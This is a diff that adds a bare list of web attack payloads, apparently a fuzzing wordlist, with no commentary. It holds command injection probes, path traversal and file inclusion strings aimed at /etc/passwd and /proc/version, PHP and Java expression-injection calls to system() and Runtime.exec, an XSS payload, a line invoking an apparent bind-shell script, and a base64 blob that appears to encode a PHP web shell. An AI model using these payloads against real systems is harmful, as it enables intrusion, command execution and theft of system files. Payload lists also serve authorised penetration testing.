@@ -1,0 +1,66 @@
+whoami
+$whoami
+@whoami
+/proc/version
+/proc/version%00
+../../proc/version
+?page=/proc/version
+page=/proc/version
+page=/proc/version%00
+&page=|_uname|
+&page=|uname|
+&page=|+uname|
+&page=+uname
+&page=|-uname|
+&page=|%+uname|
+&page=%uname
+&page=+uname
+&page=|$+uname|
+&page=|$uname|
+&page=$uname
+&page=|$_uname|
+&page=+uname%00
+&page=$+uname%00
+&page=$uname%00
+&page=file://etc/passwd
+&page=||+uname||
+&page=||uname||
+&page=||$uname||
+&page=/$proc/$version
+&page=%252e%252e%252fetc%252fpasswd%00
+&page=@whoami
+&page=|@whoami|
+&page=+@whoami
+&page=_$whoami_
+&page=+$whoami
+&page=cat+etc/passwd
+&page=cat etc/passwd
+&page=$uname+|
+&page=+uname+
+&page=|+uname+|
+&page=../proc/version%00
+&page=./proc/version%00
+++{@print(system(“whoami”))}
+|| whoami ||
+file:///etc/passwd
+&file:///etc/passwd
+_$file:///etc/passwd_
+<img src=x onerror=$.getScript("file://etc/passwd")>
+PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
+?cmd=ls
+?cmd=$ls
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${@print(system(“./tmp/bind.sh”))}
+phpcredits
++{@print(system(“whoami”))}
+${@print(system(“whoami”))}
+|{@print(system(“uid”))}
+%{@print(system(“whoami”))}
+@{@print(system(“uname -a”))}
+@@version
+${{@print(system(“uname -a”))}}
+&cmd=whoami
+ /$ls
+expect://ls
+%252e%252e%252fetc%252fpasswd%00
+data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
